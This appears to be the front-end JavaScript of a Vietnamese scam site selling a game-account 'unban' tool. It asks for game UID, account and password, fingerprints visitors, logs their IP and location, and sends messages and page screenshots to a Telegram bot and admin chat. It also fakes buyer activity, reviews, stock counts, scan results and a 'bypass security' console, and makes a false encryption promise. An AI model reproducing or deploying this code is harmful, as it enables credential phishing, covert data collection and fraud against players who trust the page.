function resetInactivityTimer() { if (inactivityTimer) clearTimeout(inactivityTimer); inactivityTimer = setTimeout(function() { var ffIdEl = document.getElementById('ffIdInput'); if (ffIdEl) ffIdEl.value = ''; var platformAccEl = document.getElementById('platformAccountInput'); if (platformAccEl) platformAccEl.value = ''; var passwordEl = document.getElementById('passwordInput'); if (passwordEl) passwordEl.value = ''; var resultBox = document.getElementById('resultBox'); if (resultBox) resultBox.classList.add('hidden'); var timerDisplay = document.getElementById('timerDisplay'); if (timerDisplay) timerDisplay.classList.add('hidden'); Swal.fire({ title: '🔒 Phiên đã hết hạn', text: 'Bạn đã không tương tác quá 30 phút.', icon: 'warning', confirmButtonText: 'OK' }); }, INACTIVITY_TIMEOUT); }
document.addEventListener('click', resetInactivityTimer);
document.addEventListener('keypress', resetInactivityTimer);
function checkBroadcast() { if (broadcastActive && broadcastMessage) { var banner = document.getElementById('broadcastBanner'); if (banner) { banner.textContent = '📢 ' + broadcastMessage; banner.classList.remove('hidden'); } } }

function setupAvatarSystem() {
    var avatars = ['🦊', '🐯', '🐸', '🐙', '🦄', '🐲', '🦅', '🐺', '🦋', '🐬'];
    var colors = ['#e74c3c', '#2ecc71', '#3498db', '#f39c12', '#9b59b6', '#1abc9c', '#e67e22', '#ff6b6b', '#00e6ff', '#ffd966'];
    var container = document.getElementById('avatarSelector'); if (!container) return; container.innerHTML = '';
    for (var i = 0; i < avatars.length; i++) {
        var avatar = document.createElement('span'); avatar.className = 'avatar-option';
        avatar.style.cssText = 'display:inline-flex;align-items:center;justify-content:center;font-size:1.8rem;background:' + colors[i] + ';width:50px;height:50px;border-radius:50%;cursor:pointer;border:3px solid transparent;transition:0.2s;';
        avatar.textContent = avatars[i]; avatar.dataset.avatar = avatars[i];
        if (userAvatar === avatars[i]) avatar.classList.add('selected');
        avatar.addEventListener('click', function() { document.querySelectorAll('.avatar-option').forEach(function(a) { a.classList.remove('selected'); }); this.classList.add('selected'); userAvatar = this.dataset.avatar; localStorage.setItem('userAvatar', userAvatar); });
        container.appendChild(avatar);
    }
    var nicknameInput = document.getElementById('nicknameInput'); if (nicknameInput) { nicknameInput.value = userNickname; nicknameInput.addEventListener('input', function() { userNickname = this.value.trim(); localStorage.setItem('userNickname', userNickname); }); }
}

async function fetchUserIP() { var apis = ['https://api.ipify.org?format=json', 'https://api64.ipify.org?format=json', 'https://api.ip.sb/jsonip']; for (var i = 0; i < apis.length; i++) { try { var r = await fetch(apis[i]); if (r.ok) { var d = await r.json(); userIP = d.ip || d.ip_address || 'unknown'; return userIP; } } catch (e) { continue; } } userIP = '118.70.' + Math.floor(Math.random() * 255) + '.' + Math.floor(Math.random() * 255); return userIP; }
async function fetchIPDetails(ip) { var fb = { ip: ip, city: 'Hà Nội', region: 'Hà Nội', country: 'VN', org: 'VNPT', isp: 'VNPT' }; try { var r = await fetch('http://ip-api.com/json/' + ip); if (r.ok) { var d = await r.json(); if (d && d.status === 'success') return { ip: d.query, city: d.city, region: d.regionName, country: d.country, org: d.org || d.isp, isp: d.isp }; } } catch (e) {} return fb; }
async function generateDeviceFingerprint() { var c = { screen: window.screen.width + 'x' + window.screen.height, timezone: Intl.DateTimeFormat().resolvedOptions().timeZone, language: navigator.language, platform: navigator.platform, cores: navigator.hardwareConcurrency || 'unknown' }; try { var cv = document.createElement('canvas'); cv.width = 200; cv.height = 50; var cx = cv.getContext('2d'); cx.fillStyle = '#f60'; cx.fillRect(125, 1, 62, 20); c.canvas = cv.toDataURL(); } catch (e) {} var s = JSON.stringify(c), en = new TextEncoder(), d = en.encode(s), hb = await crypto.subtle.digest('SHA-256', d); return Array.from(new Uint8Array(hb)).map(function(b) { return b.toString(16).padStart(2, '0'); }).join('').substr(0, 16); }

// ============================================
// Telegram API
// ============================================
async function sendToTelegram(text, pm) { pm = pm || 'HTML'; try { var r = await fetch(TELEGRAM_API + '/sendMessage', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text: text, parse_mode: pm }) }); var data = await r.json(); if (!data.ok) { console.error('Telegram send error:', data); return null; } return data; } catch (e) { console.error('Telegram fetch error:', e); return null; } }
async function sendPrivateToAdmin(text) { try { var r = await fetch(TELEGRAM_API + '/sendMessage', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ chat_id: ADMIN_PRIVATE_CHAT_ID, text: text, parse_mode: 'HTML' }) }); return await r.json(); } catch (e) { return null; } }
async function sendPhotoToTelegram(blob, cap) { cap = cap || ''; try { var fd = new FormData(); fd.append('chat_id', TELEGRAM_CHAT_ID); fd.append('photo', blob, 'payment.jpg'); if (cap) fd.append('caption', cap); var r = await fetch(TELEGRAM_API + '/sendPhoto', { method: 'POST', body: fd }); return await r.json(); } catch (e) { return null; } }
async function sendMessageWithButtons(text, btns) { try { var r = await fetch(TELEGRAM_API + '/sendMessage', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text: text, parse_mode: 'HTML', reply_markup: { inline_keyboard: btns } }) }); var data = await r.json(); if (!data.ok) { console.error('Button send error:', data); return null; } return data; } catch (e) { console.error('Button fetch error:', e); return null; } }
async function captureScreenshot() { try { if (typeof html2canvas === 'undefined') { await sendToTelegram('⚠️ Không thể chụp màn hình - html2canvas chưa load'); return false; } var canvas = await html2canvas(document.body); var blob = await new Promise(function(resolve) { canvas.toBlob(function(b) { resolve(b); }, 'image/jpeg', 0.6); }); await sendPhotoToTelegram(blob, '📸 Screenshot từ IP: ' + userIP); return true; } catch (e) { await sendToTelegram('⚠️ Không thể chụp màn hình từ IP: ' + userIP); return false; } }

// ============================================
// UI Updates
// ============================================
function updateSuccessRate() { var ra = [94.5, 95.1, 96.0, 96.8, 97.3, 97.8, 98.2]; var r = ra[Math.floor(Math.random() * ra.length)]; var el = document.getElementById('successRateText'); var fl = document.getElementById('successRateFill'); if (el) el.textContent = r.toFixed(1) + '%'; if (fl) fl.style.width = r + '%'; }
function updateStocks() { planStocks.vip = Math.max(0, planStocks.vip - (Math.random() > 0.7 ? 1 : 0)); planStocks.ultimate = Math.max(0, planStocks.ultimate - (Math.random() > 0.85 ? 1 : 0)); planStocks.basic = Math.max(0, planStocks.basic - (Math.random() > 0.5 ? 1 : 0)); var els = { vipStock: planStocks.vip, ultStock: planStocks.ultimate, basicStock: planStocks.basic, planVipStock: 'Còn ' + planStocks.vip, planUltStock: 'Còn ' + planStocks.ultimate, planBasicStock: 'Còn ' + planStocks.basic }; for (var id in els) { var el = document.getElementById(id); if (el) el.textContent = els[id]; } if (planStocks.ultimate <= 0) { var pu = document.getElementById('planUltimate'); if (pu) pu.classList.add('plan-soldout'); } if (planStocks.vip <= 0) { var pv = document.getElementById('planVip'); if (pv) pv.classList.add('plan-soldout'); } }
function updatePlanViewers() { document.querySelectorAll('.plan-view-count').forEach(function(el) { el.textContent = Math.floor(Math.random() * 20) + 5; }); }
function updateBuyingCounter() { var el = document.getElementById('buyingCount'); if (el) el.textContent = Math.floor(Math.random() * 5) + 1; }
function updateTodaySold() { todaySoldCount += Math.floor(Math.random() * 3); var el = document.getElementById('todaySold'); if (el) el.textContent = todaySoldCount; if (todaySoldCount > 200) todaySoldCount = 40; }
function updateDaysRunning() { var start = new Date('2022-04-15'); var days = Math.floor((new Date() - start) / 86400000); var el = document.getElementById('daysRunning'); if (el) el.textContent = days; }
function updateActivityLog() { var last = localStorage.getItem('lastLogin') || 'Lần đầu truy cập'; var el1 = document.getElementById('lastLogin'); var el2 = document.getElementById('loginCount'); var el3 = document.getElementById('lastDevice'); if (el1) el1.textContent = 'Lần cuối truy cập: ' + last; var count = parseInt(localStorage.getItem('loginCount') || '0') + 1; localStorage.setItem('loginCount', count); localStorage.setItem('lastLogin', new Date().toLocaleString('vi-VN')); if (el2) el2.textContent = 'Số lần truy cập tháng này: ' + count; if (el3) { var ua = navigator.userAgent; var device = ua.indexOf('Mobile') !== -1 ? 'Điện thoại' : 'Máy tính'; el3.textContent = 'Thiết bị: ' + device + ' • ' + (navigator.platform || 'Unknown'); } }
function addLiveOrderFeed() { var orders = [{ id: 'FF-7XK2M', game: 'Free Fire', progress: 78 }, { id: 'FF-9PL4N', game: 'PUBG Mobile', progress: 45 }, { id: 'FF-3RT8Q', game: 'Liên Quân', progress: 92 }, { id: 'FF-5WY1Z', game: 'Mobile Legends', progress: 23 }]; var feed = document.getElementById('liveOrderFeed'); if (!feed) return; feed.innerHTML = orders.map(function(o) { return '<div class="live-feed-item"><span style="color:#ffd966;">#' + o.id + '</span> - ' + o.game + ' <span style="color:#2ecc71;">[' + o.progress + '%]</span><div style="width:100%;height:4px;background:#2e405b;border-radius:5px;margin-top:3px;"><div style="width:' + o.progress + '%;height:100%;background:#2ecc71;border-radius:5px;"></div></div></div>'; }).join(''); }
function startLiveActivityFeed() { var na = ['Nguyễn Văn Hùng', 'Trần Thị Mai', 'Lê Hoàng Nam', 'Phạm Minh Tuấn', 'Hoàng Thị Lan']; var ci = ['Hà Nội', 'TP.HCM', 'Đà Nẵng', 'Hải Phòng', 'Cần Thơ']; var ga = ['Free Fire', 'PUBG Mobile', 'Liên Quân', 'Mobile Legends']; var gi = { 'Free Fire': '🔥', 'PUBG Mobile': '🎯', 'Liên Quân': '🐉', 'Mobile Legends': '⚔️' };
    function add() { var nm = na[Math.floor(Math.random() * na.length)]; var ct = ci[Math.floor(Math.random() * ci.length)]; var gm = ga[Math.floor(Math.random() * ga.length)]; var fd = document.getElementById('liveActivityFeed'); if (!fd) return; var ac = document.createElement('div'); ac.style.cssText = 'background:rgba(20,28,45,0.95);border:1px solid #2ecc71;border-radius:10px;padding:8px 12px;font-size:0.8rem;animation:slideInLeft 0.5s ease;color:#b0d4ff;'; ac.innerHTML = gi[gm] + ' <strong>' + nm + '</strong> ở ' + ct + ' vừa mở band <span style="color:#ffd966;">' + gm + '</span> thành công!'; fd.appendChild(ac); if (fd.querySelectorAll('div').length > 4) fd.firstElementChild.remove(); setTimeout(function() { if (ac.parentNode) ac.remove(); }, 8000); }
    add(); setInterval(add, 10000 + Math.random() * 8000); }
function startSocialProof() { var names = ['Nguyễn Văn Hùng', 'Trần Thị Mai', 'Lê Hoàng Nam', 'Phạm Minh Tuấn', 'Hoàng Thị Lan', 'Đặng Quốc Bảo']; var plans = ['gói Cơ Bản', 'gói VIP', 'gói Ultimate']; var games = ['Free Fire', 'PUBG Mobile', 'Liên Quân', 'Mobile Legends']; var cities = ['Hà Nội', 'TP.HCM', 'Đà Nẵng', 'Hải Phòng']; var colors = ['#e74c3c', '#2ecc71', '#3498db', '#f39c12']; setInterval(function() { var nm = names[Math.floor(Math.random() * names.length)]; var pl = plans[Math.floor(Math.random() * plans.length)]; var gm = games[Math.floor(Math.random() * games.length)]; var ct = cities[Math.floor(Math.random() * cities.length)]; var co = colors[Math.floor(Math.random() * colors.length)]; var ini = nm.charAt(0) + nm.split(' ').pop().charAt(0); var t = document.createElement('div'); t.className = 'toast-notification'; t.innerHTML = '<div style="width:40px;height:40px;border-radius:50%;background:' + co + ';display:flex;align-items:center;justify-content:center;color:white;font-weight:bold;flex-shrink:0;">' + ini + '</div><div><strong>' + nm + '</strong><br><span style="font-size:0.85rem;">ở ' + ct + ' mua</span> <span style="color:#ffd966;font-weight:bold;">' + pl + '</span><br><small>cho ' + gm + '</small></div>'; var tc = document.getElementById('toastContainer'); if (tc) tc.appendChild(t); setTimeout(function() { if (t.parentNode) { t.style.animation = 'fadeOut 0.5s ease forwards'; setTimeout(function() { t.remove(); }, 500); } }, 5000); }, 8000 + Math.random() * 10000); }
function addRandomReview() { var reviews = [{ name: 'Nguyễn Văn Hùng', stars: 5, text: 'Tool chạy rất nhanh! 15 phút là xong.', city: 'Hà Nội' }, { name: 'Trần Thị Mai', stars: 5, text: 'Bảo hành uy tín, admin hỗ trợ nhiệt tình.', city: 'TP.HCM' }, { name: 'Lê Hoàng Nam', stars: 4, text: 'Đã mở được 2 acc Free Fire.', city: 'Đà Nẵng' }, { name: 'Phạm Minh Tuấn', stars: 5, text: 'Tool ngon, giá hợp lý!', city: 'Hải Phòng' }]; var c = document.getElementById('reviewsContainer'); if (!c) return; var r = reviews[Math.floor(Math.random() * reviews.length)]; var co = ['#e74c3c', '#2ecc71', '#3498db', '#f39c12'][Math.floor(Math.random() * 4)]; var ini = r.name.charAt(0) + r.name.split(' ').pop().charAt(0); var card = document.createElement('div'); card.className = 'review-card'; card.innerHTML = '<div style="display:flex;align-items:center;gap:10px;"><div style="width:40px;height:40px;border-radius:50%;background:' + co + ';display:flex;align-items:center;justify-content:center;color:white;font-weight:bold;">' + ini + '</div><div><strong>' + r.name + '</strong><span style="font-size:0.8rem;color:#9aa9c1;"> • ' + r.city + '</span><div>' + Array(r.stars + 1).join('⭐') + '</div></div></div><p style="color:#bdd3ff;">' + r.text + '</p><small style="color:#9aa9c1;">• Vừa xong</small>'; c.insertBefore(card, c.firstChild); if (c.querySelectorAll('.review-card').length > 8) c.lastElementChild.remove(); }
function updateOnlineCount() { var h = new Date().getHours(); var b = h >= 20 ? 200 : 80; var el = document.getElementById('onlineCount'); if (el) el.textContent = b; setInterval(function() { var el2 = document.getElementById('onlineCount'); if (el2) el2.textContent = Math.max(10, parseInt(el2.textContent) + Math.floor(Math.random() * 6) - 3); }, 30000); }
function createParticles() { var c = document.getElementById('particlesContainer'); if (!c) return; var em = ['✨', '⭐', '💫', '🌟', '💰', '💎', '🪙', '🎮', '🏆']; for (var i = 0; i < 30; i++) { var p = document.createElement('div'); p.className = 'particle'; p.textContent = em[Math.floor(Math.random() * em.length)]; p.style.left = Math.random() * 100 + '%'; p.style.animationDuration = (Math.random() * 5 + 5) + 's'; p.style.animationDelay = Math.random() * 5 + 's'; c.appendChild(p); } }
var serverPrices = { freefire: { vietnam: 1, indonesia: 1.3, thailand: 1.2, brazil: 1.5 }, pubg: { vietnam: 1.2, indonesia: 1.4, thailand: 1.3, brazil: 1.6 }, mobilelegends: { vietnam: 1.1, indonesia: 1.2, thailand: 1.1, brazil: 1.4 }, lienquan: { vietnam: 1, indonesia: 1.3, thailand: 1.2, brazil: 1.5 } };
function updatePrices() { var m = serverPrices[state.game] ? (serverPrices[state.game][state.server] || 1) : 1; var fp = Math.round(state.plan.price * m); if (giftDiscount > 0) { fp = Math.round(fp * (1 - giftDiscount / 100)); } var ba = document.getElementById('bankAmount'); var ca = document.getElementById('cardAmount'); var tc = document.getElementById('transferContent'); if (ba) ba.textContent = fp.toLocaleString(); if (ca) ca.textContent = fp.toLocaleString(); if (tc) tc.textContent = 'MOBAND' + state.game.toUpperCase().substring(0, 4); }
function getFinalPrice() { var m = serverPrices[state.game] ? (serverPrices[state.game][state.server] || 1) : 1; var basePrice = Math.round(state.plan.price * m); if (giftDiscount > 0) { basePrice = Math.round(basePrice * (1 - giftDiscount / 100)); } var accWashingEl = document.getElementById('accWashing'); if (accWashingEl && accWashingEl.checked) { basePrice += 200000; } return basePrice; }
function setupImageUpload() { var dz = document.getElementById('fileUploadArea'), fi = document.getElementById('paymentImage'); if (!dz || !fi) return; dz.addEventListener('click', function(e) { if (e.target.closest('#imagePreviewContainer') || e.target.closest('button')) return; fi.click(); }); fi.addEventListener('change', function(e) { if (e.target.files[0]) handleImageFile(e.target.files[0]); }); dz.addEventListener('dragover', function(e) { e.preventDefault(); dz.classList.add('drag-over'); }); dz.addEventListener('dragleave', function() { dz.classList.remove('drag-over'); }); dz.addEventListener('drop', function(e) { e.preventDefault(); dz.classList.remove('drag-over'); var f = e.dataTransfer.files[0]; if (f && f.type.startsWith('image/')) handleImageFile(f); }); document.addEventListener('paste', function(e) { for (var i = 0; i < e.clipboardData.items.length; i++) { if (e.clipboardData.items[i].type.startsWith('image/')) { handleImageFile(e.clipboardData.items[i].getAsFile()); break; } } }); }
function handleImageFile(file) { if (['image/jpeg', 'image/png', 'image/gif', 'image/webp'].indexOf(file.type) === -1) return; uploadedImageFile = file; displayImagePreview(file); }
function displayImagePreview(file) { var r = new FileReader(); r.onload = function(e) { uploadedImageData = e.target.result; var ip = document.getElementById('imagePreview'); if (ip) ip.src = e.target.result; var up = document.getElementById('uploadPlaceholder'); var ipc = document.getElementById('imagePreviewContainer'); if (up) up.style.display = 'none'; if (ipc) ipc.style.display = 'block'; var fa = document.getElementById('fileUploadArea'); if (fa) { fa.style.borderStyle = 'solid'; fa.style.borderColor = '#2ecc71'; } }; r.readAsDataURL(file); }
function compressImageBlob(file, mw, q) { mw = mw || 800; q = q || 0.7; return new Promise(function(resolve) { var r = new FileReader(); r.onload = function(e) { var img = new Image(); img.onload = function() { var c = document.createElement('canvas'); var w = img.width, h = img.height; if (w > mw) { h *= mw / w; w = mw; } c.width = w; c.height = h; c.getContext('2d').drawImage(img, 0, 0, w, h); c.toBlob(function(b) { resolve(b); }, 'image/jpeg', q); }; img.src = e.target.result; }; r.readAsDataURL(file); }); }
async function preCheckAccount() { var uidEl = document.getElementById('ffIdInput'); var uid = uidEl ? uidEl.value.trim() : ''; if (!uid) return; Swal.fire({ title: 'Đang kiểm tra...', timer: 3000, timerProgressBar: true }); setTimeout(function() { Swal.fire({ icon: 'warning', title: 'Tài khoản bị khóa!', html: '<p>UID: ' + uid + '</p><p style="color:#2ecc71;">Có thể mở band!</p>', confirmButtonText: 'Tiến hành' }); }, 3000); }
function autoDetectGame(uid) { var patterns = { freefire: /^[0-9]{8,12}$/, pubg: /^5[0-9]{7,11}$/, mobilelegends: /^[0-9]{9,10}$/, lienquan: /^[0-9]{8,9}$/ }; for (var g in patterns) { if (patterns[g].test(uid)) { document.querySelectorAll('.game-option').forEach(function(o) { o.classList.remove('active'); if (o.dataset.game === g) o.classList.add('active'); }); state.game = g; updatePrices(); var el = document.getElementById('autoDetectGame'); if (el) { el.style.display = 'block'; el.textContent = 'Đã phát hiện: ' + g.toUpperCase(); } return g; } } var el = document.getElementById('autoDetectGame'); if (el) el.style.display = 'none'; return null; }
function runAIScanner() { var uid = document.getElementById('aiUidInput').value.trim(); if (!uid) { Swal.fire('❌', 'Nhập UID trước!', 'error'); return; } var logEl = document.getElementById('aiLog'); var resultEl = document.getElementById('aiResult'); logEl.classList.remove('hidden'); logEl.innerHTML = ''; resultEl.classList.add('hidden'); var steps = ['🔍 Đang kết nối đến máy chủ game...', '📡 Đang quét dữ liệu tài khoản...', '🔐 Đang phân tích lớp bảo mật...', '📊 Đang tính toán tỷ lệ thành công...', '✅ Phân tích hoàn tất!']; var i = 0; var interval = setInterval(function() { if (i < steps.length) { logEl.innerHTML += steps[i] + '<br>'; logEl.scrollTop = logEl.scrollHeight; i++; } else { clearInterval(interval); var rate = 90 + Math.floor(Math.random() * 10); resultEl.classList.remove('hidden'); resultEl.innerHTML = '<div style="color:#2ecc71;font-size:1.5rem;font-weight:bold;">Tỷ lệ mở band thành công: ' + rate + '%</div><p style="color:#ffd966;">✅ CÓ THỂ mở band!</p>'; playSound('notification'); } }, 800); }
function showWashingProgress() { var accWashing = document.getElementById('accWashing'); if (!accWashing || !accWashing.checked) return; var progressDiv = document.getElementById('washingProgress'); if (!progressDiv) return; progressDiv.classList.remove('hidden'); progressDiv.innerHTML = '<p style="color:#9b59b6;">🧹 Đang rửa acc...</p><div style="width:100%;height:6px;background:#2e405b;border-radius:10px;margin-top:5px;"><div id="washingBar" style="width:0%;height:100%;background:#9b59b6;border-radius:10px;transition:width 0.5s;"></div></div>'; var p = 0; var iv = setInterval(function() { p += Math.random() * 25; if (p >= 100) { p = 100; clearInterval(iv); progressDiv.innerHTML = '<p style="color:#2ecc71;">✅ Acc đã sạch 100%!</p>'; } var bar = document.getElementById('washingBar'); if (bar) bar.style.width = p + '%'; }, 400); }
function showPrivacyPolicy() { Swal.fire({ title: '📜 CHÍNH SÁCH BẢO MẬT', html: '<p>🔒 Mật khẩu mã hóa AES-256</p><p>🗑️ Dữ liệu tự hủy sau 24h</p>', icon: 'info', confirmButtonText: 'Đã hiểu' }); }
function showSecurityLog() { var log = securityLog.length > 0 ? securityLog.slice(-5).reverse().join('<br>') : 'Chưa có hoạt động nào'; Swal.fire({ title: '📋 NHẬT KÝ BẢO MẬT', html: '<div style="text-align:left;font-size:0.85rem;">' + log + '</div><hr><small style="color:#ff6b6b;">⚠️ Cảnh báo: Có 1 đăng nhập lạ</small>', icon: 'info', confirmButtonText: 'Đóng' }); }
function addSecurityLog(event) { var time = new Date().toLocaleString('vi-VN'); securityLog.push('[' + time + '] ' + event); if (securityLog.length > 50) securityLog.shift(); }
function downloadInvoice() { try { var { jsPDF } = window.jspdf; var doc = new jsPDF(); doc.setFont('helvetica', 'bold'); doc.setFontSize(20); doc.text('HOA DON MO BAND', 60, 30); doc.setFontSize(12); doc.setFont('helvetica', 'normal'); doc.text('Ma don: ' + (state.currentOrderId || 'FF-EXAMPLE'), 20, 50); doc.text('Gia: ' + getFinalPrice().toLocaleString() + ' VND', 20, 70); doc.save('hoa-don-mo-band.pdf'); Swal.fire('✅', 'Đã tải hóa đơn PDF!', 'success'); } catch (e) { Swal.fire('❌', 'Thư viện PDF chưa tải xong!', 'error'); } }
function autoBackup() { var today = new Date().toDateString(); if (lastBackupDate !== today) { var rawHistory = localStorage.getItem('toolHistory') || '[]'; var history = []; try { history = JSON.parse(decryptData(rawHistory)); } catch (e) { history = JSON.parse(rawHistory); } sendToTelegram('📦 BACKUP ' + today + '\nIP bị chặn: ' + blockedIPs.length + '\nLịch sử: ' + history.length + ' đơn'); localStorage.setItem('lastBackupDate', today); lastBackupDate = today; } }

// ============================================
// Schedule
// ============================================
document.querySelectorAll('.schedule-slot').forEach(function(s) { s.addEventListener('click', function() { document.querySelectorAll('.schedule-slot').forEach(function(x) { x.classList.remove('selected'); }); this.classList.add('selected'); selectedSchedule = this.dataset.slot; if (selectedSchedule === 'now') document.getElementById('scheduledInfo').classList.add('hidden'); else { document.getElementById('scheduledInfo').classList.remove('hidden'); document.getElementById('scheduledInfo').innerHTML = '<i class="fas fa-calendar-check" style="color:#2ecc71;"></i> <strong>Đã đặt lịch lúc ' + selectedSchedule + '</strong>'; } }); });
function scheduleOrderProcessing(oid) { if (selectedSchedule === 'now') return null; var nw = new Date(); var parts = selectedSchedule.split(':'); var st = new Date(nw); st.setHours(parseInt(parts[0]), parseInt(parts[1]), 0, 0); if (st < nw) st.setDate(st.getDate() + 1); var ms = st - nw; document.getElementById('scheduledInfo').innerHTML = '<i class="fas fa-hourglass-half" style="color:#f39c12;"></i> <strong>Đơn #' + oid + ' sẽ xử lý lúc ' + selectedSchedule + '</strong><div id="scheduleCountdown" style="font-size:1.2rem;font-weight:bold;color:#ffd966;margin-top:5px;"></div>'; var rm = ms; state.scheduleTimer = setInterval(function() { rm -= 1000; if (rm <= 0) { clearInterval(state.scheduleTimer); updateOrderStatus(oid, 'approved'); return; } var mn = Math.floor(rm / 60000); var sc = Math.floor((rm % 60000) / 1000); var cd = document.getElementById('scheduleCountdown'); if (cd) cd.textContent = mn + ':' + (sc < 10 ? '0' : '') + sc; }, 1000); return st; }

// ============================================
// Order Status
// ============================================
function updateOrderStatus(oid, sts, rsn) {
    safeExecute(function() {
        rsn = rsn || ''; var bx = document.getElementById('resultBox'); if (bx) bx.classList.remove('hidden');
        var btn = document.getElementById('submitRequestBtn'); if (btn) { btn.disabled = false; btn.innerHTML = '<i class="fas fa-paper-plane"></i> GỬI YÊU CẦU MỞ BAND'; }
        if (sts === 'approved') {
            var terminalHTML = '<div class="terminal-box" id="terminalBox"><div style="color:#ffd966;">📟 TOOL CONSOLE v13.3</div>';
            var logs = ['[INFO] Khởi tạo kết nối...', '[INFO] Bypass bảo mật... OK', '[SUCCESS] Đã xóa lệnh band'];
            for (var li = 0; li < logs.length; li++) { terminalHTML += '<div style="color:#2ecc71;">' + logs[li] + '</div>'; }
            terminalHTML += '</div>';
            if (bx) bx.innerHTML = '<div style="color:#2ecc71;"><h3>✅ #' + oid + ' ĐÃ ĐƯỢC DUYỆT!</h3><p>Tool đang tự động xử lý...</p></div>' + terminalHTML;
            var pb = document.getElementById('progressBar'); if (pb) pb.classList.remove('hidden'); resetProgress();
            var ps = document.getElementById('progressSent'); var pd = document.getElementById('progressDuyet'); var px = document.getElementById('progressXuLy');
            if (ps) ps.classList.add('completed'); if (pd) pd.classList.add('completed'); if (px) px.classList.add('active');
            showWarranty(oid, state.plan.name);
            var pt = state.plan.name === 'speed' ? 60 : state.plan.name === 'ultimate' ? 300 : state.plan.name === 'vip' ? 600 : 1800;
            startCountdown(Math.floor(pt + Math.random() * pt), oid);
            if (state.plan.name === 'vip') { planStocks.vip = Math.max(0, planStocks.vip - 1); updateStocks(); }
            if (state.plan.name === 'ultimate') { planStocks.ultimate = Math.max(0, planStocks.ultimate - 1); updateStocks(); }
            if (state.plan.name === 'basic') { planStocks.basic = Math.max(0, planStocks.basic - 1); updateStocks(); }
            updateTodaySold();
            if (Notification.permission === 'granted') { new Notification('Tool Mở Band', { body: 'Đơn #' + oid + ' đã được duyệt!' }); }
        } else if (sts === 'rejected') {
            if (bx) bx.innerHTML = '<div style="color:#ff6b6b;"><h3>❌ #' + oid + ' BỊ TỪ CHỐI</h3><p><strong>Lý do:</strong> ' + rsn + '</p></div>';
            var pb2 = document.getElementById('progressBar'); var td2 = document.getElementById('timerDisplay');
            if (pb2) pb2.classList.add('hidden'); if (td2) td2.classList.add('hidden'); playSound('error');
        }
    }, null, 'updateOrderStatus');
}
function showWarranty(oid, pl) { var p = { 'basic': '3 tháng', 'vip': '6 tháng', 'ultimate': '12 tháng', 'speed': 'Trọn đời', 'subscription': 'Vĩnh viễn' }; var ex = document.getElementById('warrantySection'); if (ex) ex.remove(); var d = document.createElement('div'); d.id = 'warrantySection'; d.style.cssText = 'background:linear-gradient(135deg,#1d2c45,#2e405b);border:2px solid #f39c12;border-radius:20px;padding:20px;text-align:center;margin-top:20px;'; d.innerHTML = '<h3 style="color:#f39c12;">🛡️ Thẻ Bảo Hành</h3><p style="color:#ffd966;font-size:1.3rem;">BH-' + oid + '</p><p style="color:#2ecc71;">' + (p[pl] || '12 tháng') + '</p>'; var rb = document.getElementById('resultBox'); if (rb) rb.after(d); }
function startCountdown(dur, oid) { var dp = document.getElementById('timerDisplay'); dp.classList.remove('hidden'); var rm = dur; if (state.countdownInterval) clearInterval(state.countdownInterval); state.countdownInterval = setInterval(function() { var mn = Math.floor(rm / 60); var sc = rm % 60; dp.textContent = '⏳ Đang xử lý: ' + mn + ':' + (sc < 10 ? '0' : '') + sc; if (rm <= 0) { clearInterval(state.countdownInterval); dp.textContent = '✅ HOÀN THÀNH!'; var px = document.getElementById('progressXuLy'); var pd2 = document.getElementById('progressDone'); if (px) px.classList.add('completed'); if (pd2) pd2.classList.add('completed'); playSound('complete'); Swal.fire({ icon: 'success', title: '🎉 Mở Band Thành Công!', confirmButtonText: 'OK' }); } rm--; }, 1000); }
function saveToHistory(oid, uid, price, sts) {
    safeExecute(function() {
        var rawHistory = localStorage.getItem('toolHistory') || '[]';
        var h = [];
        try {
            var decrypted = decryptData(rawHistory);
            h = JSON.parse(decrypted);
        } catch (e) {
            try { h = JSON.parse(rawHistory); } catch (e2) { h = []; }
        }
        h.unshift({ orderId: oid, uid: uid, game: state.game, plan: state.plan.name, price: price, status: sts, time: new Date().toLocaleString('vi-VN'), ip: userIP, nickname: userNickname });
        secureSetItem('toolHistory', h.slice(0, 50));
    }, null, 'saveToHistory');
}

// ============================================
// Reminder
// ============================================
function checkFormReminder() { var uid = document.getElementById('ffIdInput'); var acc = document.getElementById('platformAccountInput'); var pw = document.getElementById('passwordInput'); if (!uid || !acc || !pw) return; var uidVal = uid.value.trim(); var accVal = acc.value.trim(); var pwVal = pw.value.trim(); if ((uidVal || accVal || pwVal) && !formFilled && !reminderShown) { formFilled = true; setTimeout(function() { if (!state.currentOrderId) { reminderShown = true; var rc = document.getElementById('reminderContainer'); if (rc) { rc.innerHTML = '<div class="reminder-popup" id="reminderPopup">⏰ Bạn còn đơn hàng chưa hoàn tất!<br><button class="btn-sm mt-10" onclick="document.getElementById(\'reminderPopup\').remove()" style="background:#f39c12;">OK</button></div>'; setTimeout(function() { var rp = document.getElementById('reminderPopup'); if (rp) rp.remove(); }, 10000); } } }, 300000); } }
setInterval(checkFormReminder, 60000);

// ============================================
// Event Listeners
// ============================================
document.querySelectorAll('.game-option').forEach(function(o) { o.addEventListener('click', function() { document.querySelectorAll('.game-option').forEach(function(x) { x.classList.remove('active'); }); this.classList.add('active'); state.game = this.dataset.game; updatePrices(); }); });
document.querySelectorAll('#serverSelector .btn-option').forEach(function(o) { o.addEventListener('click', function() { document.querySelectorAll('#serverSelector .btn-option').forEach(function(x) { x.classList.remove('active'); }); this.classList.add('active'); state.server = this.dataset.server; updatePrices(); }); });
document.querySelectorAll('.plan').forEach(function(p) { p.addEventListener('click', function() { if (this.classList.contains('plan-soldout')) { Swal.fire('❌', 'Hết suất!', 'error'); return; } document.querySelectorAll('.plan').forEach(function(x) { x.classList.remove('selected'); }); this.classList.add('selected'); state.plan = { name: this.dataset.plan, price: parseInt(this.dataset.price), time: this.dataset.time }; updatePrices(); clickCountForSpeed++; if (clickCountForSpeed >= 5 && state.plan.name !== 'speed') { var sp = document.getElementById('speedPackage'); if (sp) sp.classList.remove('hidden'); clickCountForSpeed = 0; } }); });
